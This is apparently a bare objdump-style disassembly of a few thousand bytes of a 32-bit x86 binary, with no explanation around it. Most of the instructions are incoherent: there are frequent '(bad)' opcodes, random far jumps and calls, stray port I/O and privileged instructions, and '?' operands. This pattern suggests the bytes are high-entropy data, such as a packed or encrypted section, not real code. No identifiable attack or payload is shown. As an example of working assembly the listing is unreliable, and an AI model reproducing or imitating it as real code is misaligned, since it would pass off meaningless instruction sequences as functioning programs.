  41fcc8:	scas   al,BYTE PTR es:[edi]
  41fcc9:	cmc    
  41fcca:	push   ecx
  41fccb:	push   ss
  41fccc:	add    ch,bh
  41fcce:	(bad)  
  41fccf:	or     eax,0x9ee4dc91
  41fcd4:	push   ds
  41fcd5:	aas    
  41fcd6:	stos   DWORD PTR es:[edi],eax
  41fcd7:	pushf  
  41fcd8:	mov    WORD PTR [ebx],fs
  41fcda:	add    esp,ebp
  41fcdc:	sti    
  41fcdd:	out    dx,eax
  41fcde:	cld    
  41fcdf:	retf   
  41fce0:	jb     0x41fd57
  41fce2:	popf   
  41fce3:	xchg   edi,eax
  41fce4:	(bad)  
  41fce5:	mov    dh,0x12
  41fce7:	not    DWORD PTR [ecx+0x357cdf28]
  41fced:	icebp  
  41fcee:	lahf   
  41fcef:	rcr    DWORD PTR [eax+0x77],0x74
  41fcf3:	test   BYTE PTR [ebp+0x43a19c96],bh
  41fcf9:	jp     0x41fccb
  41fcfb:	and    DWORD PTR [ebx],ecx
  41fcfd:	or     esp,edx
  41fcff:	nop
  41fd00:	mov    esp,0x1ee99c84
  41fd05:	dec    edx
  41fd06:	fst    QWORD PTR [edi-0x28]
  41fd09:	jns    0x41fcac
  41fd0b:	mov    cl,0x90
  41fd0d:	jecxz  0x41fd8e
  41fd0f:	dec    ecx
  41fd10:	sbb    al,0xe6
  41fd12:	fwait
  41fd13:	lds    ecx,FWORD PTR [edx]
  41fd15:	repnz pop ebx
  41fd17:	int    0x84
  41fd19:	pop    eax
  41fd1a:	loope  0x41fd2f
  41fd1c:	pop    edx
  41fd1d:	ret    
  41fd1e:	scas   al,BYTE PTR es:[di]
  41fd20:	xchg   esp,eax
  41fd21:	and    eax,DWORD PTR [esi]
  41fd23:	mov    ebp,0x51b5a369
  41fd28:	jle    0x41fd88
  41fd2a:	mov    edi,0x14ad9b4b
  41fd2f:	and    ebx,DWORD PTR [ebp-0x63]
  41fd32:	(bad)  
  41fd33:	mov    al,0x8e
  41fd35:	adc    al,0x20
  41fd37:	mov    edi,0x5b88c0a1
  41fd3c:	adc    DWORD PTR [ecx-0x52d15baf],ecx
  41fd42:	or     ah,bl
  41fd44:	and    dh,0x5d
  41fd47:	mov    ebx,0x5add1ffa
  41fd4c:	lods   eax,DWORD PTR ds:[esi]
  41fd4d:	xor    eax,0x5c41776c
  41fd52:	jb     0x41fd51
  41fd54:	mov    esp,0x131c1ec0
  41fd59:	mov    edi,0x59776832
  41fd5e:	in     al,dx
  41fd5f:	push   ebp
  41fd60:	inc    edx
  41fd61:	pusha  
  41fd62:	push   cs
  41fd63:	mov    gs,ebp
  41fd65:	push   edx
  41fd66:	add    DWORD PTR [eax],eax
  41fd68:	fld    QWORD PTR [ecx]
  41fd6a:	jo     0x41fd11
  41fd6c:	or     eax,esi
  41fd6e:	mov    bl,0x43
  41fd70:	imul   eax,DWORD PTR [ebx],0x5686be0a
  41fd76:	xor    eax,0xf4e7bb85
  41fd7b:	mov    dh,0xb1
  41fd7d:	sahf   
  41fd7e:	in     al,dx
  41fd7f:	xlat   BYTE PTR ds:[ebx]
  41fd80:	cld    
  41fd81:	adc    dh,BYTE PTR [esi]
  41fd83:	stc    
  41fd84:	mov    eax,0x9678e397
  41fd89:	repnz ds fdiv st,st(7)
  41fd8d:	retf   
  41fd8e:	add    eax,esp
  41fd90:	and    eax,edi
  41fd92:	std    
  41fd93:	test   BYTE PTR [ebp+0x649024ae],bl
  41fd99:	test   DWORD PTR [esi-0x3b],esi
  41fd9c:	jge    0x41fd20
  41fd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd9f:	clc    
  41fda0:	std    
  41fda1:	pop    ss
  41fda2:	or     cl,dh
  41fda4:	cld    
  41fda5:	rcr    DWORD PTR [edi],cl
  41fda7:	push   ss
  41fda8:	pop    ecx
  41fda9:	push   cs
  41fdaa:	mov    ds,WORD PTR [ebx-0x6af89a29]
  41fdb0:	outs   dx,DWORD PTR ds:[esi]
  41fdb1:	enter  0x31d6,0x95
  41fdb5:	dec    edx
  41fdb6:	out    0x4d,eax
  41fdb8:	jo     0x41fd41
  41fdba:	mov    fs,WORD PTR [edi-0x57041e5a]
  41fdc0:	out    0x6,al
  41fdc2:	adc    al,0x1c
  41fdc4:	lahf   
  41fdc5:	mov    ds:0x50d6b021,al
  41fdca:	lea    esp,[ecx+eiz*4-0x4f]
  41fdce:	adc    eax,0x2da72bf6
  41fdd3:	call   FWORD PTR [edi-0x3085a9ec]
  41fdd9:	stc    
  41fdda:	aad    0xbe
  41fddc:	fisttp WORD PTR [edi]
  41fdde:	sub    eax,0x18b30a85
  41fde3:	cmp    al,0x17
  41fde5:	xchg   edi,eax
  41fde6:	rcl    BYTE PTR [esi+0x64],1
  41fde9:	pop    ds
  41fdea:	jl     0x41fdc3
  41fdec:	dec    esi
  41fded:	ins    DWORD PTR es:[edi],dx
  41fdee:	in     al,dx
  41fdef:	mov    bl,0x54
  41fdf1:	mov    cl,0x7c
  41fdf3:	jno    0x41fd7c
  41fdf5:	stc    
  41fdf6:	xor    al,0x78
  41fdf8:	aam    0x37
  41fdfa:	xchg   esi,eax
  41fdfb:	xor    bl,dl
  41fdfd:	mov    cl,0x7f
  41fdff:	jmp    0x4b210564
  41fe04:	stos   BYTE PTR es:[edi],al
  41fe05:	aas    
  41fe06:	stos   BYTE PTR es:[edi],al
  41fe07:	pop    eax
  41fe08:	enter  0x18e8,0xd8
  41fe0c:	push   ds
  41fe0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe0e:	mul    BYTE PTR [eax-0x33]
  41fe11:	mov    esp,0x60587a61
  41fe16:	ds mov bl,0x89
  41fe19:	rcl    ecx,1
  41fe1b:	mov    esi,0x3ddde728
  41fe20:	(bad)  
  41fe22:	scas   al,BYTE PTR es:[edi]
  41fe23:	into   
  41fe24:	inc    edx
  41fe25:	sbb    al,0xe3
  41fe27:	aad    0xf0
  41fe29:	jl     0x41fe9d
  41fe2b:	icebp  
  41fe2c:	and    al,0xaa
  41fe2e:	mov    ch,0xc5
  41fe30:	pop    edi
  41fe31:	sti    
  41fe32:	or     esi,esp
  41fe34:	pop    esp
  41fe35:	jmp    0xf909:0x6a2ba3df
  41fe3c:	sbb    DWORD PTR [edi],0x8
  41fe3f:	inc    esi
  41fe40:	outs   dx,BYTE PTR ds:[esi]
  41fe41:	shl    BYTE PTR [edx+0x71c1ab8],cl
  41fe47:	xchg   edx,eax
  41fe48:	mov    ebp,DWORD PTR [edx-0x3d]
  41fe4b:	mov    dh,0xae
  41fe4d:	pusha  
  41fe4e:	cmp    al,0x1d
  41fe50:	ins    BYTE PTR es:[edi],dx
  41fe51:	lods   al,BYTE PTR ds:[esi]
  41fe52:	xchg   esp,eax
  41fe53:	adc    edx,esi
  41fe55:	data16 jns 0x41fe83
  41fe58:	and    al,0xc0
  41fe5a:	jae    0x41fe41
  41fe5c:	jp     0x41fe8b
  41fe5e:	and    BYTE PTR [esi+0x45],0xf8
  41fe62:	test   BYTE PTR [ebx+edi*8],dl
  41fe65:	jecxz  0x41fea4
  41fe67:	loop   0x41fdf4
  41fe69:	jbe    0x41fecd
  41fe6b:	pusha  
  41fe6c:	jnp    0x41fe84
  41fe6e:	sbb    eax,0x4af65187
  41fe73:	mov    al,BYTE PTR [ecx]
  41fe75:	ja     0x41fe10
  41fe77:	mov    ecx,0xf3b6b8b9
  41fe7c:	pop    edx
  41fe7d:	cs scas eax,DWORD PTR es:[edi]
  41fe7f:	cld    
  41fe80:	and    ah,bh
  41fe82:	mov    dh,0xea
  41fe84:	icebp  
  41fe85:	rcl    eax,0x22
  41fe88:	sbb    ah,ah
  41fe8a:	and    bl,BYTE PTR [ebx+0x4e]
  41fe8d:	pushf  
  41fe8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe8f:	ffreep st(5)
  41fe91:	cld    
  41fe92:	ret    0x345
  41fe95:	pop    edi
  41fe96:	mov    WORD PTR [ecx-0x7a3cad56],ss
  41fe9c:	or     BYTE PTR [esi],bl
  41fe9e:	dec    eax
  41fe9f:	jmp    0xcf1c:0xf6d7471d
  41fea6:	mov    dh,0x4b
  41fea8:	aam    0xfe
  41feaa:	cmp    BYTE PTR [edx-0x41086f8d],ah
  41feb0:	xor    DWORD PTR [edx-0x28e17666],edx
  41feb6:	sub    ecx,DWORD PTR [eax+0x4e]
  41feb9:	push   0xc755ea4c
  41febe:	and    DWORD PTR [esi+eiz*1],ecx
  41fec1:	popf   
  41fec2:	dec    edi
  41fec3:	not    DWORD PTR [esi+eax*2]
  41fec6:	loope  0x41ff0e
  41fec8:	hlt    
  41fec9:	mov    bl,0xdf
  41fecb:	jo     0x41fef0
  41fecd:	adc    dh,BYTE PTR [edi-0x53]
  41fed0:	mov    fs,WORD PTR [ecx+0x3a5aad4c]
  41fed6:	lea    ebx,[ebx-0x67]
  41fed9:	in     eax,dx
  41feda:	push   eax
  41fedb:	loope  0x41fe97
  41fedd:	sti    
  41fede:	fwait
  41fedf:	sbb    al,BYTE PTR ds:0x108feb7d
  41fee5:	sbb    al,0x2e
  41fee7:	and    al,0x41
  41fee9:	out    dx,eax
  41feea:	push   ecx
  41feeb:	mov    ds:0x3f1528a2,al
  41fef0:	jbe    0x41feea
  41fef2:	sbb    eax,esi
  41fef4:	or     ah,BYTE PTR [edi+0x7b]
  41fef7:	cwde   
  41fef8:	push   0x5afc7111
  41fefd:	inc    ecx
  41fefe:	aam    0xc4
  41ff00:	xchg   ecx,eax
  41ff01:	out    dx,eax
  41ff02:	jbe    0x41ff78
  41ff04:	fbld   TBYTE PTR [esi+esi*4-0x46]
  41ff08:	add    eax,0x62ce80b6
  41ff0d:	xor    eax,0xabf39e54
  41ff12:	loop   0x41ff43
  41ff14:	fxch   st(6)
  41ff16:	shl    BYTE PTR [ecx+ebx*4+0x4d006311],cl
  41ff1d:	hlt    
  41ff1e:	imul   eax,DWORD PTR [esi+0x737dea7],0xed5dbd3e
  41ff28:	shr    esp,1
  41ff2a:	xchg   esp,eax
  41ff2b:	lods   eax,DWORD PTR ds:[esi]
  41ff2c:	xor    BYTE PTR [edi-0x7d],0x36
  41ff30:	nop
  41ff31:	push   ss
  41ff32:	in     al,dx
  41ff33:	xchg   esi,eax
  41ff34:	push   ss
  41ff35:	neg    BYTE PTR [edi-0x78]
  41ff38:	mov    ebx,0x7d75fea3
  41ff3d:	jae    0x41ff34
  41ff3f:	and    BYTE PTR [ecx+ecx*2],cl
  41ff42:	push   ds
  41ff43:	sbb    DWORD PTR [edx],eax
  41ff45:	pushf  
  41ff46:	fcmovu st,st(4)
  41ff48:	sar    BYTE PTR [ecx-0x306e4eb2],0x6a
  41ff4f:	(bad)  
  41ff50:	jmp    0xadc0de32
  41ff55:	dec    edi
  41ff56:	jne    0x41ff64
  41ff58:	call   0x584875ce
  41ff5d:	mov    DWORD PTR [ecx+eax*1+0x1a5f9039],ecx
  41ff64:	adc    ah,BYTE PTR [ecx-0x60e0c63c]
  41ff6a:	or     DWORD PTR [eax+0x782c1f6b],0x7
  41ff71:	(bad)  
  41ff72:	arpl   WORD PTR [esp+edx*2-0x43d0fc03],sp
  41ff79:	in     al,dx
  41ff7a:	lea    ecx,[ebp+0x1dff981]
  41ff80:	dec    ecx
  41ff81:	mov    cl,0xff
  41ff83:	mov    esp,0xd6306e0c
  41ff88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff89:	mov    ecx,0x39af120c
  41ff8e:	mov    ds:0x67793c68,eax
  41ff93:	inc    edx
  41ff94:	movhps xmm6,QWORD PTR [eax+0x5d]
  41ff98:	add    BYTE PTR [edi-0x71],al
  41ff9b:	ficom  WORD PTR [edx+esi*1]
  41ff9e:	cwde   
  41ff9f:	or     BYTE PTR [ecx+edx*8-0x2f32ae59],al
  41ffa6:	sub    eax,0x9ca6516f
  41ffab:	arpl   WORD PTR ds:0x4ce0f192,si
  41ffb1:	test   BYTE PTR [esi],ch
  41ffb3:	and    ebp,DWORD PTR [ebx-0x42a3a7c4]
  41ffb9:	js     0x420016
  41ffbb:	ds out dx,eax
  41ffbd:	pop    edx
  41ffbe:	push   es
  41ffbf:	xchg   ebx,eax
  41ffc0:	push   ebx
  41ffc1:	bound  esp,QWORD PTR [edx+0x30]
  41ffc4:	rcr    DWORD PTR [eax],0x1f
  41ffc7:	cmp    DWORD PTR [ecx+0x44],eax
  41ffca:	xchg   dl,bl
  41ffcc:	xchg   edx,eax
  41ffcd:	push   ds
  41ffce:	xchg   edx,eax
  41ffcf:	inc    ecx
  41ffd0:	das    
  41ffd1:	cmp    DWORD PTR [ecx+0x3af51fa8],edi
  41ffd7:	add    DWORD PTR [edi],esp
  41ffd9:	inc    eax
  41ffda:	push   ebx
  41ffdb:	mov    edx,0x41f8035f
  41ffe0:	daa    
  41ffe1:	mov    esi,0xa36953ab
  41ffe6:	loop   0x42000a
  41ffe8:	(bad)
  41ffeb:	pop    esp
  41ffec:	in     al,dx
  41ffed:	add    DWORD PTR [edx-0x62],esi
  41fff0:	xor    eax,0x24f8421c
  41fff5:	xchg   esp,eax
  41fff6:	cmp    BYTE PTR [ebx+0x52902383],cl
  41fffc:	inc    ecx
  41fffd:	int3   
  41fffe:	frstor [ebx+ebp*8-0x499c015f]
  420005:	dec    ebp
  420006:	mov    ch,0x2f
  420008:	sti    
  420009:	mov    ch,0xd1
  42000b:	cmp    BYTE PTR [ebp+0x29eed852],bl
  420011:	push   esp
  420012:	mov    dl,0x49
  420014:	(bad)
  420017:	xor    cl,ah
  420019:	pop    edx
  42001a:	jmp    0x2f52:0x6f8c3c36
  420021:	xchg   edi,eax
  420022:	or     dh,BYTE PTR [ebx-0x68]
  420025:	add    esi,DWORD PTR [edx-0x37]
  420028:	push   ds
  420029:	enter  0xe3b3,0x91
  42002d:	scas   eax,DWORD PTR es:[edi]
  42002e:	imul   edx,DWORD PTR [ebp-0x2e],0x7b
  420032:	mov    BYTE PTR [edi+0x6c929243],bl
  420038:	pusha  
  420039:	add    edi,DWORD PTR [ecx-0x64]
  42003c:	div    DWORD PTR [ebp+0x67c6fb15]
  420042:	retf   
  420043:	inc    edi
  420044:	sbb    eax,DWORD PTR [edi-0x42]
  420047:	popf   
  420048:	rcl    BYTE PTR [ebp-0x3bb214f7],cl
  42004e:	in     eax,0x9a
  420050:	mov    ds:0xc1a9e739,al
  420055:	je     0x42002b
  420057:	and    eax,0x996442e9
  42005c:	lahf   
  42005d:	add    al,0xf4
  42005f:	push   0xb5d73d6
  420064:	push   ecx
  420065:	(bad)  
  420066:	(bad)  [ebp-0x2f76c09b]
  42006c:	xor    ch,BYTE PTR [esi-0x48be8e69]
  420072:	jge    0x4200dc
  420074:	push   edi
  420075:	adc    BYTE PTR [eax+0x57],dh
  420078:	adc    eax,0x258ec094
  42007d:	lds    ebx,FWORD PTR [ecx+ecx*8]
  420080:	out    0xcc,al
  420082:	push   ss
  420083:	add    esi,DWORD PTR [ebx+ecx*1-0x56]
  420087:	cwde   
  420088:	in     al,dx
  420089:	push   ds
  42008a:	leave  
  42008b:	ret    0xc1d2
  42008e:	fsubr  DWORD PTR [ebx+0x44a92e0b]
  420094:	mov    bh,0xfd
  420096:	retf   
  420097:	lods   eax,DWORD PTR ds:[esi]
  420098:	fs push ss
  42009a:	add    BYTE PTR [ebx],al
  42009c:	push   edx
  42009d:	sub    al,0x26
  42009f:	add    ah,cl
  4200a1:	xor    BYTE PTR [edx-0x5953abfb],bh
  4200a7:	frstor [ebp-0x7e]
  4200aa:	mov    BYTE PTR [ecx+eax*1],dh
  4200ad:	cmc    
  4200ae:	jb     0x42009a
  4200b0:	sbb    BYTE PTR [edi-0x6c1f9e4f],al
  4200b6:	neg    DWORD PTR [esi-0x46ca65f3]
  4200bc:	or     al,0xfc
  4200be:	and    DWORD PTR [edx+0x56],edi
  4200c1:	mov    al,0xd4
  4200c3:	les    ecx,FWORD PTR [edx*2-0x16fd5894]
  4200ca:	mov    fs,ebx
  4200cc:	ret    
  4200cd:	mov    edx,0x933ff5ed
  4200d2:	retf   
  4200d3:	cmp    BYTE PTR [eax+0x66a41bc6],cl
  4200d9:	cmp    ebp,DWORD PTR [esi]
  4200db:	lea    eax,[edi+0xbfffc58]
  4200e1:	gs jl  0x420095
  4200e4:	xor    eax,0xb0b768ee
  4200e9:	add    eax,0x5854059c
  4200ee:	push   ecx
  4200ef:	outs   dx,BYTE PTR ds:[esi]
  4200f0:	je     0x42013d
  4200f2:	jne    0x420092
  4200f4:	or     BYTE PTR [edx-0x6dd94879],dh
  4200fa:	rcl    esi,cl
  4200fc:	push   0x966253c8
  420101:	fs ds xchg edx,eax
  420104:	iret   
  420105:	scas   al,BYTE PTR es:[edi]
  420106:	imul   BYTE PTR ds:0x7b643cd3
  42010c:	fcmovbe st,st(5)
  42010e:	(bad)  
  42010f:	int    0xbc
  420111:	in     eax,0xca
  420113:	out    0xa6,al
  420115:	inc    edi
  420116:	mov    ?,edx
  420118:	push   0x174dd802
  42011d:	jge    0x4200f3
  42011f:	daa    
  420120:	mov    BYTE PTR [ebx],cl
  420122:	es jo  0x4200f0
  420125:	into   
  420126:	imul   ebp,DWORD PTR [edx+0x3],0x7a
  42012a:	das    
  42012b:	cs arpl si,bx
  42012e:	sbb    BYTE PTR [edi-0x7c55f4c4],ch
  420134:	pop    ecx
  420135:	(bad)  
  420136:	sar    BYTE PTR [eax],cl
  420138:	mov    ecx,0x74bc5cae
  42013d:	ja     0x42012b
  42013f:	daa    
  420140:	mov    BYTE PTR [ebp+0x5d],al
  420143:	pusha  
  420144:	sbb    BYTE PTR ss:[edx],ch
  420147:	js     0x4200e3
  420149:	mov    esp,0x12043950
  42014e:	xor    dh,al
  420150:	cmp    DWORD PTR [esi],ebx
  420152:	stc    
  420153:	pop    ds
  420154:	adc    ch,cl
  420156:	fstp   QWORD PTR [esi+ebp*1]
  420159:	bound  edx,QWORD PTR [eax-0x53]
  42015c:	cmp    eax,0x5fd2e58a
  420161:	int3   
  420162:	icebp  
  420163:	aad    0x90
  420165:	or     cl,BYTE PTR [ecx+edx*2+0x176144c6]
  42016c:	iret   
  42016d:	pop    edx
  42016e:	or     ah,BYTE PTR [eax+0x64]
  420171:	xchg   ecx,eax
  420172:	sbb    eax,0x88d84e2b
  420177:	sub    cl,BYTE PTR [esi-0x44]
  42017a:	aas    
  42017b:	jmp    0x4201d3
  42017d:	loop   0x420107
  42017f:	adc    esp,0xffffff92
  420182:	jecxz  0x420202
  420184:	ja     0x4201d8
  420186:	aam    0x7d
  420188:	dec    ecx
  420189:	inc    ebp
  42018a:	ja     0x4201dd
  42018c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42018d:	xchg   esi,ebp
  42018f:	dec    BYTE PTR [esi+0x28]
  420192:	pop    edi
  420193:	dec    ecx
  420194:	mov    bl,0xef
  420196:	sub    eax,DWORD PTR [esi]
  420198:	stos   BYTE PTR es:[edi],al
  420199:	fwait
  42019a:	mov    ebp,0x84aa5376
  42019f:	pop    ss
  4201a0:	inc    esp
  4201a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201a2:	inc    ebp
  4201a3:	sbb    ah,BYTE PTR [ebp-0x5]
  4201a6:	dec    eax
  4201a7:	addr16 in eax,0x8e
  4201aa:	test   al,0xe6
  4201ac:	sahf   
  4201ad:	pop    eax
  4201ae:	or     eax,0x70066dfb
  4201b3:	xor    eax,0x836d36
  4201b8:	aad    0xf8
  4201ba:	(bad)  
  4201bb:	sar    DWORD PTR [ebp-0xe],1
  4201be:	bound  edx,QWORD PTR [ebx]
  4201c0:	retf   
  4201c1:	cdq    
  4201c2:	and    al,0xc7
  4201c4:	arpl   WORD PTR [ebp-0x5441ed54],di
  4201ca:	or     al,0x41
  4201cc:	push   ecx
  4201cd:	xchg   esp,eax
  4201ce:	test   cl,ah
  4201d0:	adc    eax,0x2162dafc
  4201d5:	cmp    ebx,ecx
  4201d7:	sub    esp,esi
  4201d9:	xchg   edi,eax
  4201da:	aam    0x37
  4201dc:	jae    0x42020c
  4201de:	xchg   ecx,eax
  4201df:	pop    edi
  4201e0:	xor    eax,0xa562026f
  4201e5:	push   esi
  4201e6:	cli    
  4201e7:	cmp    DWORD PTR [ebx+0x3de71cd7],esp
  4201ed:	mov    WORD PTR [ebx],?
  4201ef:	popa   
  4201f0:	inc    ecx
  4201f1:	mov    edi,0x853ab4ec
  4201f6:	add    BYTE PTR [ecx-0x23f30441],dh
  4201fc:	jbe    0x420267
  4201fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ff:	xor    ch,bh
  420201:	jne    0x42023a
  420203:	aad    0xa1
  420205:	push   0xffffffcd
  420207:	gs adc al,0x38
  42020a:	in     eax,0xc3
  42020c:	das    
  42020d:	daa    
  42020e:	addr16 sub eax,0xc9e21499
  420214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420215:	lods   eax,DWORD PTR ds:[esi]
  420216:	sub    al,0x5c
  420218:	xor    DWORD PTR [esi-0x6fab2b75],0xffffff87
  42021f:	ja     0x4201a6
  420221:	test   dh,0xd2
  420224:	xor    al,0xca
  420226:	and    DWORD PTR [ebp*2-0x221f6db],ebp
  42022d:	stc    
  42022e:	loopne 0x4201b0
  420230:	sbb    dh,BYTE PTR [edx-0xc9ba731]
  420236:	neg    BYTE PTR ds:0x46d560eb
  42023c:	cmp    ebp,DWORD PTR [edi-0x1b]
  42023f:	jns    0x4201e1
  420241:	sbb    bl,BYTE PTR [eax-0x569e0113]
  420247:	loope  0x420233
  420249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42024a:	cmp    ah,bl
  42024c:	mov    dh,0xda
  42024e:	cmc    
  42024f:	pushf  
  420250:	mov    al,0x2a
  420252:	mov    al,ds:0x75c7ed38
  420257:	stos   DWORD PTR es:[edi],eax
  420258:	retf   
  420259:	cmp    dl,dl
  42025b:	jmp    0xcdca:0x5d032218
  420262:	xchg   ecx,eax
  420263:	jne    0x4202d3
  420265:	aas    
  420266:	mov    al,0x38
  420268:	add    ecx,DWORD PTR [edx+0x27]
  42026b:	fucomip st,st(7)
  42026d:	cmc    
  42026e:	cmp    BYTE PTR [edx-0x4e],al
  420271:	(bad)  [esi]
  420273:	fsubr  st,st(7)
  420275:	jg     0x4202f1
  420277:	call   0x708:0xa7ac8aa2
  42027e:	sbb    eax,0x16f2ba08
  420283:	xlat   BYTE PTR ds:[ebx]
  420284:	stc    
  420285:	pop    eax
  420286:	pop    es
  420287:	in     eax,dx
  420288:	aad    0x3b
  42028a:	mov    edx,DWORD PTR [edi+edx*2+0x7f]
  42028e:	(bad)  
  42028f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420290:	mov    esp,0x794f6c62
  420295:	test   DWORD PTR [edi],ebp
  420297:	pop    ebx
  420298:	xchg   ecx,eax
  420299:	dec    esi
  42029a:	repz add bl,BYTE PTR [ebp+ecx*4+0x7f008f10]
  4202a2:	rcl    al,0x92
  4202a5:	jp     0x42026a
  4202a7:	je     0x420292
  4202a9:	repnz push 0x1034d45e
  4202af:	popa   
  4202b0:	dec    esp
  4202b1:	cmp    DWORD PTR [esi-0x2ca956f5],edx
  4202b7:	les    ebp,FWORD PTR [ecx+0x4dfcda3e]
  4202bd:	int    0xa4
  4202bf:	xchg   esp,eax
  4202c0:	pusha  
  4202c1:	popf   
  4202c2:	jae    0x42029f
  4202c4:	xor    BYTE PTR [ebx-0x6ea8f46e],0x9
  4202cb:	in     al,dx
  4202cc:	jo     0x4202dd
  4202ce:	mov    esp,0x2f767dbc
  4202d3:	push   ecx
  4202d4:	xchg   ebx,eax
  4202d5:	inc    edi
  4202d6:	sbb    al,0x52
  4202d8:	in     al,0x6d
  4202da:	jns    0x4202a4
  4202dc:	div    DWORD PTR [edi]
  4202de:	add    eax,0xa3e21c0f
  4202e3:	push   ebx
  4202e4:	push   0x8217b0ae
  4202e9:	sbb    ah,BYTE PTR [ebp+esi*8+0x99b8a84]
  4202f0:	(bad)  
  4202f2:	mov    al,ds:0x55abe47b
  4202f7:	lods   eax,DWORD PTR ds:[esi]
  4202f8:	xchg   edi,eax
  4202f9:	rol    DWORD PTR [edx],1
  4202fb:	mov    esi,0xc82b620b
  420300:	scas   eax,DWORD PTR es:[edi]
  420301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420302:	cmp    DWORD PTR [esi+0x7bad138b],0xffffffdb
  420309:	les    ebp,FWORD PTR [ecx+0x74]
  42030c:	leave  
  42030d:	add    eax,DWORD PTR [eax]
  42030f:	into   
  420310:	int    0xfe
  420312:	jl     0x4202b3
  420314:	mov    BYTE PTR [edi+0xe],0xed
  420318:	sub    eax,0xe7e5d5fb
  42031d:	ret    0x6bc2
  420320:	fild   QWORD PTR [eax]
  420322:	mov    dh,0xd8
  420324:	push   ebx
  420325:	xlat   BYTE PTR ds:[ebx]
  420326:	jle    0x42039c
  420328:	push   ds
  420329:	xchg   esi,eax
  42032a:	enter  0xcf6c,0x4d
  42032e:	jbe    0x42030d
  420330:	call   0x51798f1c
  420335:	sub    eax,0xcbc5ac00
  42033a:	into   
  42033b:	push   edi
  42033c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42033d:	lock dec ebx
  42033f:	push   esi
  420340:	inc    esi
  420341:	sbb    al,0x5f
  420343:	(bad)  
  420344:	cmp    al,0x4e
  420346:	cld    
  420347:	xlat   BYTE PTR ds:[ebx]
  420348:	cmp    al,0x59
  42034a:	ss push ds
  42034c:	mov    esi,0x5de7a33c
  420351:	cld    
  420352:	adc    bl,BYTE PTR [eax+0x517e5b0f]
  420358:	jmp    FWORD PTR [edi-0x2e]
  42035b:	push   eax
  42035c:	push   es
  42035d:	mov    bh,0xfc
  42035f:	add    BYTE PTR [ebp-0x5da7e512],dh
  420365:	or     DWORD PTR [esi+eax*8-0x6f56d4b],ebx
  42036c:	cwde   
  42036d:	inc    edx
  42036e:	or     DWORD PTR ds:0xa1bb1e8e,0xffffff85
  420375:	rol    DWORD PTR [ecx],0xf0
  420378:	ins    BYTE PTR es:[edi],dx
  420379:	xor    DWORD PTR [edi-0x3f605d8],eax
  42037f:	mov    ds:0x1fde9c5c,al
  420384:	jecxz  0x4203b8
  420386:	pop    ss
  420387:	les    ebx,FWORD PTR [eax]
  420389:	inc    ebp
  42038a:	mov    DWORD PTR [eax],edi
  42038c:	or     DWORD PTR [ebx],edi
  42038e:	loope  0x420314
  420390:	sbb    DWORD PTR [ecx],ebx
  420392:	fsub   QWORD PTR ds:0x1d577ba8
  420398:	out    dx,eax
  420399:	lds    edi,FWORD PTR [edx+edi*2]
  42039c:	push   cs
  42039d:	ret    0x9de8
  4203a0:	ds inc ebp
  4203a2:	retf   0xaf2
  4203a5:	and    al,0x5
  4203a7:	xchg   edi,eax
  4203a8:	das    
  4203a9:	xor    ah,BYTE PTR [edx+eax*2-0x62487bb6]
  4203b0:	in     al,0xbf
  4203b2:	icebp  
  4203b3:	fst    QWORD PTR [eax]
  4203b5:	jmp    0x678e:0xd9ef62ae
  4203bc:	mov    dh,0x3c
  4203be:	push   0xffffffc5
  4203c0:	test   BYTE PTR [esi+0x10ec9a3c],bl
  4203c6:	xchg   BYTE PTR [esi+0x42],dl
  4203c9:	xor    edx,DWORD PTR gs:[esi+ebp*2-0x7d]
  4203ce:	and    ch,BYTE PTR [ebp-0x2e09336b]
  4203d4:	mov    cl,BYTE PTR [ecx-0x2bfedc67]
  4203da:	mov    ch,0x3c
  4203dc:	push   0x86c17429
  4203e1:	xchg   edi,eax
  4203e2:	xor    DWORD PTR ds:0xf6eb6b36,0xffffffab
  4203e9:	clc    
  4203ea:	dec    esi
  4203eb:	mov    bh,0xe5
  4203ed:	test   BYTE PTR [esi+0x760eba1e],al
  4203f3:	cli    
  4203f4:	arpl   bp,bx
  4203f6:	add    eax,0xcce318c0
  4203fb:	cmp    eax,DWORD PTR [esi+ebp*1-0x78e1415f]
  420402:	add    BYTE PTR ds:0x379c384d,dl
  420408:	push   ebx
  420409:	jmp    0x328b67d4
  42040e:	mov    dh,0xe0
  420410:	mov    edx,0x3a764c12
  420415:	mov    esi,DWORD PTR [esp+ebx*4+0x5c]
  420419:	mov    bl,0xa4
  42041b:	pop    eax
  42041c:	aaa    
  42041d:	leave  
  42041e:	sbb    esi,ebx
  420420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420421:	js     0x4203f2
  420423:	fldenv [ebx+0x37]
  420426:	push   ebp
  420427:	xchg   edi,eax
  420428:	je     0x42046d
  42042a:	mov    esi,0xf9b34b22
  42042f:	inc    esp
  420430:	ins    BYTE PTR es:[edi],dx
  420431:	enter  0x8a28,0x9a
  420435:	mov    BYTE PTR [ecx-0x61],bl
  420438:	mov    ch,0x46
  42043a:	sbb    al,0xe5
  42043c:	pop    ebx
  42043d:	jnp    0x4203d2
  42043f:	sbb    esp,0x3b
  420442:	fadd   st,st(5)
  420444:	sar    DWORD PTR [ecx],1
  420446:	pusha  
  420447:	retf   0x1838
  42044a:	(bad)  
  42044b:	sti    
  42044c:	js     0x4204c8
  42044e:	into   
  42044f:	sti    
  420450:	xor    esi,DWORD PTR [edx]
  420452:	mov    eax,0xe1617550
  420457:	xchg   edx,eax
  420458:	fwait
  420459:	push   es
  42045a:	icebp  
  42045b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42045c:	inc    edi
  42045d:	sbb    ebx,DWORD PTR [edi]
  42045f:	test   eax,0x2325e18c
  420464:	ror    dh,0xb2
  420467:	inc    ebx
  420468:	push   0xbd621e4b
  42046d:	(bad)  
  42046e:	jae    0x42045a
